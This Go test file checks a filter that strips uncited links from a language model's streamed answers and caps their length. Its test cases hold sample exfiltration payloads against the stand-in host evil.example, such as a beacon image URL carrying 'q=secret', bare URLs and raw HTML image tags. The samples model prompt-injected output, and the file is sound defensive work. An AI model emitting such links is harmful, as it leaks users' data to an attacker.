package going

import (
	"errors"
	"strings"
	"testing"

	"github.com/sjawhar/envoy/internal/contracts"
)

// The two hits a test's citation set holds, and one target no citation set holds: the filter
// admits a link by its href alone, so the href is what each test names.
var (
	citedIssue   = Hit{Kind: "issue", ID: "INFRA-1279", Title: "Answer a question", Href: "/issues/INFRA-1279"}
	citedComment = Hit{Kind: "comment", ID: "7", Title: "Who owns the order", Href: "/issues/INFRA-1279#c7"}
)

const outsideHref = "/issues/INFRA-9999"

// stream is one filter and everything it emitted, so a test reads the stream as a reader does.
type stream struct {
	events []Event
	// failAt is the event the writer fails at, counted from one; zero never fails.
	failAt int
	fault  error
}

// emit is the stream's writer, which fails at failAt so a test can prove the filter stops there.
func (s *stream) emit(event Event) error {
	s.events = append(s.events, event)
	if s.failAt > 0 && len(s.events) == s.failAt {
		s.fault = errors.New("the stream's writer failed")
		return s.fault
	}
	return nil
}

// names is every event's name in the order it was emitted.
func (s *stream) names() []string {
	names := make([]string, len(s.events))
	for i, event := range s.events {
		names[i] = event.Name
	}
	return names
}

// tail is the last n event names, the order Close's own events are checked in.
func (s *stream) tail(n int) []string {
	names := s.names()
	if len(names) < n {
		return names
	}
	return names[len(names)-n:]
}

// text is the whole answer a reader saw, which is what a dropped link must hold no byte of.
func (s *stream) text() string {
	var out strings.Builder
	for _, event := range s.events {
		if event.Name == contracts.GoingEventText {
			out.WriteString(event.Data.(TextData).Text)
		}
	}
	return out.String()
}

// only is the one event named, and fails the test when the stream holds none or several.
func (s *stream) only(t *testing.T, name string) Event {
	t.Helper()
	var found []Event
	for _, event := range s.events {
		if event.Name == name {
			found = append(found, event)
		}
	}
	if len(found) != 1 {
		t.Fatalf("stream holds %d %s events, want exactly 1: %v", len(found), name, s.names())
	}
	return found[0]
}

// count is how many events of that name the stream holds.
func (s *stream) count(name string) int {
	total := 0
	for _, event := range s.events {
		if event.Name == name {
			total++
		}
	}
	return total
}

// dropped is how many links the changed event says the server dropped, and zero when the stream
// holds no changed event at all.
func (s *stream) dropped(t *testing.T) int {
	t.Helper()
	if s.count(contracts.GoingEventChanged) == 0 {
		return 0
	}
	return s.only(t, contracts.GoingEventChanged).Data.(ChangedData).Dropped
}

// terminal checks the one rule every run of the filter keeps: exactly one terminal event, last.
func (s *stream) terminal(t *testing.T) Event {
	t.Helper()
	var terminals []Event
	for _, event := range s.events {
		if event.Terminal() {
			terminals = append(terminals, event)
		}
	}
	if len(terminals) != 1 {
		t.Fatalf("stream holds %d terminal events, want exactly 1: %v", len(terminals), s.names())
	}
	if last := s.events[len(s.events)-1]; !last.Terminal() {
		t.Fatalf("stream ends with %s, want it to end with its terminal event: %v", last.Name, s.names())
	}
	return terminals[0]
}

// citationsOf is the citation set the run gave the model, keyed by href as the filter reads it.
func citationsOf(hits ...Hit) map[string]Hit {
	citations := make(map[string]Hit, len(hits))
	for _, hit := range hits {
		citations[hit.Href] = hit
	}
	return citations
}

// drive writes every delta to one filter and closes it, failing the test on an error the test
// did not ask for.
func drive(t *testing.T, citations map[string]Hit, deltas ...string) *stream {
	t.Helper()
	emitted := &stream{}
	filter := newAnswerFilter(citations, emitted.emit)
	for i, delta := range deltas {
		if err := filter.Write(delta); err != nil {
			t.Fatalf("Write(%d, %q): %v", i, delta, err)
		}
	}
	if err := filter.Close(); err != nil {
		t.Fatalf("Close: %v", err)
	}
	return emitted
}

// pieces cuts text into runs of size bytes, so a test drives the filter with deltas that fall on
// no boundary of a word or a link, as a real completion's frames do.
func pieces(text string, size int) []string {
	var out []string
	for len(text) > size {
		out = append(out, text[:size])
		text = text[size:]
	}
	if text != "" {
		out = append(out, text)
	}
	return out
}

// words is a reply of n words, each of them distinct, so a cut can be located in the answer.
func words(n int) string {
	var out strings.Builder
	for i := range n {
		if i > 0 {
			out.WriteByte(' ')
		}
		out.WriteString("word")
		out.WriteString(strings.Repeat("x", i%3))
	}
	return out.String()
}

// TestFilterEmitsWholeWordsAsTheyArrive: a reader is told the words of each delta as that delta
// arrives, so the answer still streams, and never the half of a word the delta ended in - that
// word is held until a space, or Close, completes it, which is what lets every token be judged
// before a reader sees it.
func TestFilterEmitsWholeWordsAsTheyArrive(t *testing.T) {
	deltas := []string{"Dispatch keeps ", "the broadcast or", "der on the issue."}
	seen := []string{
		"Dispatch keeps ",
		"Dispatch keeps the broadcast ",
		"Dispatch keeps the broadcast order on the ",
	}
	emitted := &stream{}
	filter := newAnswerFilter(citationsOf(citedIssue), emitted.emit)
	for i, delta := range deltas {
		if err := filter.Write(delta); err != nil {
			t.Fatalf("Write(%d, %q): %v", i, delta, err)
		}
		if got := emitted.text(); got != seen[i] {
			t.Errorf("after delta %d the reader has seen %q, want %q", i, got, seen[i])
		}
	}
	if err := filter.Close(); err != nil {
		t.Fatalf("Close: %v", err)
	}
	if got, want := emitted.text(), strings.Join(deltas, ""); got != want {
		t.Errorf("answer = %q, want %q", got, want)
	}
	emitted.terminal(t)
}

// TestFilterCutsTheAnswerAtTheWordCap: a reply far past the cap is cut at
// contracts.GoingAnswerWordMax words, cut says so with that count, nothing after it is emitted,
// and end still follows - a cut answer is an answer.
func TestFilterCutsTheAnswerAtTheWordCap(t *testing.T) {
	emitted := drive(t, citationsOf(citedIssue), pieces(words(300), 7)...)
	if got := len(strings.Fields(emitted.text())); got != contracts.GoingAnswerWordMax {
		t.Errorf("answer carries %d words, want %d", got, contracts.GoingAnswerWordMax)
	}
	cut := emitted.only(t, contracts.GoingEventCut)
	if got := cut.Data.(CutData).Words; got != contracts.GoingAnswerWordMax {
		t.Errorf("cut words = %d, want %d", got, contracts.GoingAnswerWordMax)
	}
	for i, event := range emitted.events {
		if event.Name == contracts.GoingEventCut {
			for _, after := range emitted.events[i+1:] {
				if after.Name == contracts.GoingEventText {
					t.Errorf("a text event was emitted after the cut: %v", emitted.names())
				}
			}
			break
		}
	}
	if got := emitted.count(contracts.GoingEventNone); got != 0 {
		t.Errorf("stream holds %d none events, want none for an answer the cap cut: %v", got, emitted.names())
	}
	if got, want := emitted.names()[len(emitted.events)-1], contracts.GoingEventEnd; got != want {
		t.Errorf("stream ends with %s, want %s after a cut: %v", got, want, emitted.names())
	}
	if got := emitted.terminal(t).Data.(EndData).Words; got != contracts.GoingAnswerWordMax {
		t.Errorf("end words = %d, want %d", got, contracts.GoingAnswerWordMax)
	}
}

// TestFilterKeepsALinkInTheCitationSet: a link to a hit the model was given survives whole,
// markdown and all, and the hit is named once however often the answer links it.
func TestFilterKeepsALinkInTheCitationSet(t *testing.T) {
	for _, tc := range []struct {
		name   string
		answer string
		items  int
	}{
		{
			"linked once",
			"See [Answer a question](/issues/INFRA-1279) for the order.",
			1,
		},
		{
			"the same item linked twice",
			"See [Answer a question](/issues/INFRA-1279) and [it again](/issues/INFRA-1279).",
			1,
		},
		{
			"two items",
			"See [Answer a question](/issues/INFRA-1279) and [Who owns the order](/issues/INFRA-1279#c7).",
			2,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			emitted := drive(t, citationsOf(citedIssue, citedComment), pieces(tc.answer, 5)...)
			if got := emitted.text(); got != tc.answer {
				t.Errorf("answer = %q, want %q", got, tc.answer)
			}
			if got := emitted.count(contracts.GoingEventItem); got != tc.items {
				t.Errorf("stream holds %d item events, want %d: %v", got, tc.items, emitted.names())
			}
			if got := emitted.count(contracts.GoingEventNone); got != 0 {
				t.Errorf("stream holds %d none events, want none for an answer the model wrote", got)
			}
			if got := emitted.dropped(t); got != 0 {
				t.Errorf("changed dropped = %d, want none for a link the model was given", got)
			}
			end := emitted.terminal(t)
			if got := end.Data.(EndData).Items; got != tc.items {
				t.Errorf("end items = %d, want %d", got, tc.items)
			}
			if got, want := end.Data.(EndData).Words, len(strings.Fields(tc.answer)); got != want {
				t.Errorf("end words = %d, want %d", got, want)
			}
			if first := emitted.events[0]; first.Name != contracts.GoingEventText {
				t.Errorf("stream begins with %s, want the text before the link first", first.Name)
			}
		})
	}
}

// TestFilterNeverEmitsALinkOutsideTheCitationSet: no byte of such a link reaches a reader - not
// its text, not its target - and Close says how many were dropped.
func TestFilterNeverEmitsALinkOutsideTheCitationSet(t *testing.T) {
	answer := "Read [some other issue](" + outsideHref + ") and [a third one](" + outsideHref + ") instead."
	emitted := drive(t, citationsOf(citedIssue), pieces(answer, 6)...)
	got := emitted.text()
	if got != "Read  and  instead." {
		t.Errorf("answer = %q, want the dropped links gone whole", got)
	}
	for _, forbidden := range []string{outsideHref, "some other issue", "a third one", "[", "]", "(", ")"} {
		if strings.Contains(got, forbidden) {
			t.Errorf("answer %q carries %q, which a dropped link may leave no byte of", got, forbidden)
		}
	}
	if dropped := emitted.dropped(t); dropped != 2 {
		t.Errorf("changed dropped = %d, want 2", dropped)
	}
	if got, want := emitted.tail(2), []string{contracts.GoingEventChanged, contracts.GoingEventEnd}; strings.Join(got, ",") != strings.Join(want, ",") {
		t.Errorf("stream ends %v, want %v: %v", got, want, emitted.names())
	}
	for _, name := range emitted.names()[:len(emitted.events)-2] {
		if name != contracts.GoingEventText {
			t.Errorf("stream holds a %s event before its tail, want cleared text alone: %v", name, emitted.names())
		}
	}
	emitted.terminal(t)
}

// TestFilterDropsEveryLinkFormOutsideTheCitationSet: markdown links what the model writes in
// more forms than the one [text](target), and an item's own text can tell the model to write any
// of them, so every form but a resolved link to a hit the model was given is dropped whole and
// counted. Each case is driven at several delta sizes, since a form the model splits over frames
// is the same form.
func TestFilterDropsEveryLinkFormOutsideTheCitationSet(t *testing.T) {
	for _, tc := range []struct {
		name string
		// answer is what the model wrote, want the whole text the reader may see of it, and
		// forbidden the bytes of the dropped form that may reach no text frame at all.
		answer    string
		want      string
		forbidden []string
		dropped   int
	}{
		{
			name:      "an inline link to a target the model was never given",
			answer:    "Read [some other issue](" + outsideHref + ") instead.",
			want:      "Read  instead.",
			forbidden: []string{outsideHref, "some other issue", "[", "]", "(", ")"},
			dropped:   1,
		},
		{
			name:      "an inline image, even of an item the model was given",
			answer:    "Look at ![the chart](/issues/INFRA-1279) now.",
			want:      "Look at  now.",
			forbidden: []string{"/issues/INFRA-1279", "the chart", "!", "[", "]", "(", ")"},
			dropped:   1,
		},
		{
			name:      "a reference link and the definition that gives it its target",
			answer:    "See [the order][r] for it.\n\n[r]: https://evil.example/x",
			want:      "See  for it.\n\n",
			forbidden: []string{"evil.example", "https", "the order", "[", "]", ":"},
			dropped:   2,
		},
		{
			name:      "a reference image, which a page fetches with no click",
			answer:    "![beacon][p]\n\n[p]: https://evil.example/pixel.png?q=secret",
			want:      "\n\n",
			forbidden: []string{"evil.example", "pixel.png", "secret", "beacon", "!", "[", "]"},
			dropped:   2,
		},
		{
			name:      "a collapsed reference",
			answer:    "See [the order][] for it.",
			want:      "See  for it.",
			forbidden: []string{"the order", "[", "]"},
			dropped:   1,
		},
		{
			name:      "a definition the model indented",
			answer:    "The order is settled.\n  [r]: https://evil.example/x\n",
			want:      "The order is settled.\n  \n",
			forbidden: []string{"evil.example", "https", "[r]", ":"},
			dropped:   1,
		},
		{
			name:      "an autolink",
			answer:    "Read <https://evil.example/x> now.",
			want:      "Read  now.",
			forbidden: []string{"evil.example", "https", "<", ">"},
			dropped:   1,
		},
		{
			name:      "an email autolink",
			answer:    "Mail <ops@evil.example> now.",
			want:      "Mail  now.",
			forbidden: []string{"evil.example", "ops@", "<", ">"},
			dropped:   1,
		},
		{
			name:      "a raw HTML image, which a page fetches with no click",
			answer:    `Read <img src="https://evil.example/pixel.png"> now.`,
			want:      "Read  now.",
			forbidden: []string{"evil.example", "img", "src", "<", ">"},
			dropped:   1,
		},
		{
			name:      "a raw HTML tag and its closing tag",
			answer:    "Say <span title=\"x\">it</span> plainly.",
			want:      "Say it plainly.",
			forbidden: []string{"span", "title", "<", ">"},
			dropped:   2,
		},
		{
			name:      "a bare URL, which a renderer links with no markdown at all",
			answer:    "Read https://evil.example/x now.",
			want:      "Read  now.",
			forbidden: []string{"evil.example", "https", "://"},
			dropped:   1,
		},
		{
			name:      "a bare www host",
			answer:    "Read WWW.evil.example/x now.",
			want:      "Read  now.",
			forbidden: []string{"evil.example", "WWW", "www"},
			dropped:   1,
		},
		{
			name:      "a bare mailto address",
			answer:    "Mail mailto:ops@evil.example now.",
			want:      "Mail  now.",
			forbidden: []string{"evil.example", "mailto"},
			dropped:   1,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			for _, size := range []int{1, 4, 1000} {
				emitted := drive(t, citationsOf(citedIssue, citedComment), pieces(tc.answer, size)...)
				got := emitted.text()
				if got != tc.want {
					t.Errorf("deltas of %d bytes: answer = %q, want %q", size, got, tc.want)
				}
				for _, forbidden := range tc.forbidden {
					if strings.Contains(got, forbidden) {
						t.Errorf("deltas of %d bytes: answer %q carries %q, which a dropped form may leave no byte of", size, got, forbidden)
					}
				}
				if dropped := emitted.dropped(t); dropped != tc.dropped {
					t.Errorf("deltas of %d bytes: changed dropped = %d, want %d: %v", size, dropped, tc.dropped, emitted.names())
				}
				if items := emitted.count(contracts.GoingEventItem); items != 0 {
					t.Errorf("deltas of %d bytes: stream holds %d item events, want none for an answer that cited nothing", size, items)
				}
				emitted.terminal(t)
			}
		})
	}
}

// TestFilterKeepsTextThatOnlyLooksLikeALink: the control for every form above. The same shapes
// that are not links - a bracket no reference or definition follows, a < that opens no tag, a
// host with no scheme - are ordinary text, and a reader is given them as the model wrote them,
// so each rule above drops a link and not the prose around it.
func TestFilterKeepsTextThatOnlyLooksLikeALink(t *testing.T) {
	for _, answer := range []string{
		"The order is [not a link] here.",
		"The order is [not a link][ here.",
		"See [the order] for it, and [the order] again.",
		"Mind the ! and the [order] alike.",
		"The count is 3 < 5 and 7 > 2 here.",
		"It costs <3 of the budget.",
		"Read evil.example/x for it.",
		"Read www for it.",
		"The label order: is settled.",
		"Mind the <3 and the [brackets] alike.",
	} {
		t.Run(answer, func(t *testing.T) {
			for _, size := range []int{1, 4, 1000} {
				emitted := drive(t, citationsOf(citedIssue), pieces(answer, size)...)
				if got := emitted.text(); got != answer {
					t.Errorf("deltas of %d bytes: answer = %q, want it as the model wrote it, %q", size, got, answer)
				}
				if dropped := emitted.dropped(t); dropped != 0 {
					t.Errorf("deltas of %d bytes: changed dropped = %d, want none: this is text, not a link", size, dropped)
				}
			}
		})
	}
}

// TestFilterSaysNoneOnlyWhenTheModelWroteNothing: none says the model produced no answer text at
// all - a run that spent its calls and wrote nothing - and says nothing about what the answer
// linked. An answer that kept no link is shown, and its end's items of 0 is what tells the
// reader it rests on no source.
func TestFilterSaysNoneOnlyWhenTheModelWroteNothing(t *testing.T) {
	for _, tc := range []struct {
		name   string
		deltas []string
		// text is the whole answer the reader is shown, and tail the events that close the
		// stream after it, however many text events the deltas came to.
		text string
		tail []string
	}{
		{
			name: "the model wrote nothing at all",
			tail: []string{contracts.GoingEventNone, contracts.GoingEventEnd},
		},
		{
			name:   "the model wrote only space",
			deltas: []string{" ", "\n"},
			text:   " \n",
			tail:   []string{contracts.GoingEventNone, contracts.GoingEventEnd},
		},
		{
			name:   "an answer that links nothing is an answer",
			deltas: []string{"Dispatch holds nothing about that."},
			text:   "Dispatch holds nothing about that.",
			tail:   []string{contracts.GoingEventEnd},
		},
		{
			name:   "an answer whose every link was dropped is no answer at all",
			deltas: []string{"[some other issue](" + outsideHref + ")"},
			tail:   []string{contracts.GoingEventChanged, contracts.GoingEventNone, contracts.GoingEventEnd},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			emitted := drive(t, citationsOf(citedIssue), tc.deltas...)
			if got := emitted.text(); got != tc.text {
				t.Errorf("answer = %q, want %q", got, tc.text)
			}
			if got := emitted.tail(len(tc.tail)); strings.Join(got, ",") != strings.Join(tc.tail, ",") {
				t.Errorf("stream ends %v, want %v: %v", got, tc.tail, emitted.names())
			}
			for _, name := range emitted.names()[:len(emitted.events)-len(tc.tail)] {
				if name != contracts.GoingEventText {
					t.Errorf("stream holds a %s event before its tail, want cleared text alone: %v", name, emitted.names())
				}
			}
			if got := emitted.terminal(t).Data.(EndData).Items; got != 0 {
				t.Errorf("end items = %d, want 0", got)
			}
		})
	}
}

// TestFilterHoldsALinkSpanSplitAcrossDeltas: the span arrives in pieces no one of which is a
// link, and nothing of it is emitted until it closes - what reaches a reader before that is
// always the start of the answer it ends with, and never half a link.
func TestFilterHoldsALinkSpanSplitAcrossDeltas(t *testing.T) {
	for _, tc := range []struct {
		name   string
		deltas []string
		want   string
		items  int
	}{
		{
			"a kept link",
			[]string{"See ", "[Answ", "er a ques", "tion](/iss", "ues/INFRA-1279", ") now."},
			"See [Answer a question](/issues/INFRA-1279) now.",
			1,
		},
		{
			"a dropped link",
			[]string{"See ", "[some ", "other issue]", "(" + outsideHref, ") now."},
			"See  now.",
			0,
		},
		{
			"a dropped autolink",
			[]string{"See ", "<https:", "//evil.exa", "mple/x", "> now."},
			"See  now.",
			0,
		},
		{
			"one byte at a time",
			pieces("See [Answer a question](/issues/INFRA-1279) now.", 1),
			"See [Answer a question](/issues/INFRA-1279) now.",
			1,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			emitted := &stream{}
			filter := newAnswerFilter(citationsOf(citedIssue), emitted.emit)
			for i, delta := range tc.deltas {
				if err := filter.Write(delta); err != nil {
					t.Fatalf("Write(%d, %q): %v", i, delta, err)
				}
				held := emitted.text()
				// Everything emitted so far is the answer's own opening: a byte that is not
				// there is a byte the filter emitted before it knew whether to.
				if !strings.HasPrefix(tc.want, held) {
					t.Fatalf("after delta %d the answer is %q, want a start of %q", i, held, tc.want)
				}
				// A link is emitted whole or not at all, so no bracket stands in that opening
				// without the ) that closed its target.
				if strings.Count(held, "[") != strings.Count(held, ")") {
					t.Fatalf("after delta %d the answer is %q, want no half of a link in it", i, held)
				}
			}
			if err := filter.Close(); err != nil {
				t.Fatalf("Close: %v", err)
			}
			if got := emitted.text(); got != tc.want {
				t.Errorf("answer = %q, want %q", got, tc.want)
			}
			if got := emitted.count(contracts.GoingEventItem); got != tc.items {
				t.Errorf("stream holds %d item events, want %d", got, tc.items)
			}
			emitted.terminal(t)
		})
	}
}

// TestFilterDropsAHeldLinkTheCutWouldSplit: the cap falls inside a kept link, so the link is
// dropped whole rather than half emitted, it names no item, and the drop is the cut's - it raises
// no changed.
func TestFilterDropsAHeldLinkTheCutWouldSplit(t *testing.T) {
	answer := words(contracts.GoingAnswerWordMax-1) + " [Answer a question](/issues/INFRA-1279) and more words after it."
	emitted := drive(t, citationsOf(citedIssue), pieces(answer, 9)...)
	got := emitted.text()
	if strings.ContainsAny(got, "[]()") {
		t.Errorf("answer = %q, want no part of the link the cut split", got)
	}
	if count := len(strings.Fields(got)); count != contracts.GoingAnswerWordMax-1 {
		t.Errorf("answer carries %d words, want the %d before the link", count, contracts.GoingAnswerWordMax-1)
	}
	if words := emitted.only(t, contracts.GoingEventCut).Data.(CutData).Words; words != contracts.GoingAnswerWordMax-1 {
		t.Errorf("cut words = %d, want %d", words, contracts.GoingAnswerWordMax-1)
	}
	if got := emitted.count(contracts.GoingEventChanged); got != 0 {
		t.Errorf("stream holds %d changed events, want none: the cut dropped that link, not the citation set", got)
	}
	if got := emitted.count(contracts.GoingEventItem); got != 0 {
		t.Errorf("stream holds %d item events, want none for a link that was never emitted", got)
	}
	emitted.terminal(t)
}

// TestFilterDropsAHeldWordTheCutWouldSplit: the cap falls at a word still being written, so the
// answer ends at the word before it and no half word is emitted.
func TestFilterDropsAHeldWordTheCutWouldSplit(t *testing.T) {
	emitted := &stream{}
	filter := newAnswerFilter(citationsOf(citedIssue), emitted.emit)
	if err := filter.Write(words(contracts.GoingAnswerWordMax) + " halfaw"); err != nil {
		t.Fatalf("Write: %v", err)
	}
	if err := filter.Write("ord and the rest."); err != nil {
		t.Fatalf("second Write: %v", err)
	}
	if err := filter.Close(); err != nil {
		t.Fatalf("Close: %v", err)
	}
	if got := emitted.text(); strings.Contains(got, "halfaw") {
		t.Errorf("answer = %q, want no half of the word the cut fell at", got[max(0, len(got)-40):])
	}
	if got := len(strings.Fields(emitted.text())); got != contracts.GoingAnswerWordMax {
		t.Errorf("answer carries %d words, want %d", got, contracts.GoingAnswerWordMax)
	}
	if words := emitted.only(t, contracts.GoingEventCut).Data.(CutData).Words; words != contracts.GoingAnswerWordMax {
		t.Errorf("cut words = %d, want %d", words, contracts.GoingAnswerWordMax)
	}
}

// TestFilterEmitsASpanThatIsNoLink: a span resolved as plain text is emitted as it stands - a ]
// no target follows, a newline inside the span, a span the model never closed - because with
// every definition dropped such brackets link nothing and render as themselves.
func TestFilterEmitsASpanThatIsNoLink(t *testing.T) {
	for _, tc := range []struct {
		name   string
		answer string
		want   string
	}{
		{"a bracket no target follows", "The order is [not a link] here.", "The order is [not a link] here."},
		{"a newline inside the span", "The order is [not\na link either.", "The order is [not\na link either."},
		{"a newline inside the target", "The order is [a](/issues/\nINFRA-1279) here.", "The order is [a](/issues/\nINFRA-1279) here."},
		{"brackets inside brackets", "The order is [one [two](/issues/INFRA-1279) here.", "The order is [one [two](/issues/INFRA-1279) here."},
		{"a span still held at the end", "The order is [unterminated", "The order is [unterminated"},
		{"a target still held at the end", "The order is [a](/issues/INFRA-1279", "The order is [a](/issues/INFRA-1279"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			emitted := drive(t, citationsOf(citedIssue), pieces(tc.answer, 4)...)
			if got := emitted.text(); got != tc.want {
				t.Errorf("answer = %q, want %q", got, tc.want)
			}
			if got := emitted.count(contracts.GoingEventChanged); got != 0 {
				t.Errorf("stream holds %d changed events, want none for a span that was no link", got)
			}
			emitted.terminal(t)
		})
	}
}

// TestFilterHandsTheWritersFailureToItsCaller: the stream's writer has failed, so the filter
// stops where it failed and hands that error back. It keeps no copy of the failure of its own:
// the run holds that the writer failed, and one copy of that state is all there is to keep true.
func TestFilterHandsTheWritersFailureToItsCaller(t *testing.T) {
	t.Run("the text before an item", func(t *testing.T) {
		emitted := &stream{failAt: 1}
		filter := newAnswerFilter(citationsOf(citedIssue), emitted.emit)
		err := filter.Write("See [Answer a question](/issues/INFRA-1279) and more. ")
		if !errors.Is(err, emitted.fault) {
			t.Fatalf("Write error = %v, want the writer's own failure %v", err, emitted.fault)
		}
		if len(emitted.events) != 1 {
			t.Errorf("stream holds %d events, want the one the writer failed at: %v", len(emitted.events), emitted.names())
		}
	})
	t.Run("an event of Close's own", func(t *testing.T) {
		emitted := &stream{failAt: 2}
		filter := newAnswerFilter(citationsOf(citedIssue), emitted.emit)
		if err := filter.Write("Dispatch holds nothing about that. "); err != nil {
			t.Fatalf("Write: %v", err)
		}
		if err := filter.Close(); !errors.Is(err, emitted.fault) {
			t.Fatalf("Close error = %v, want the writer's own failure %v", err, emitted.fault)
		}
		if got, want := emitted.names(), []string{contracts.GoingEventText, contracts.GoingEventEnd}; strings.Join(got, ",") != strings.Join(want, ",") {
			t.Errorf("events = %v, want %v", got, want)
		}
	})
}

// TestFilterCountsTheWordsStringsFieldsCounts: the count the cut and the end carry is
// strings.Fields over everything the reader saw, however the deltas split its words.
func TestFilterCountsTheWordsStringsFieldsCounts(t *testing.T) {
	for _, size := range []int{1, 3, 7, 1000} {
		answer := "Dispatch keeps the broadcast order on [Answer a question](/issues/INFRA-1279) itself, not on the comment."
		emitted := drive(t, citationsOf(citedIssue), pieces(answer, size)...)
		want := len(strings.Fields(emitted.text()))
		if got := emitted.terminal(t).Data.(EndData).Words; got != want {
			t.Errorf("deltas of %d bytes: end words = %d, want strings.Fields' own %d", size, got, want)
		}
	}
}
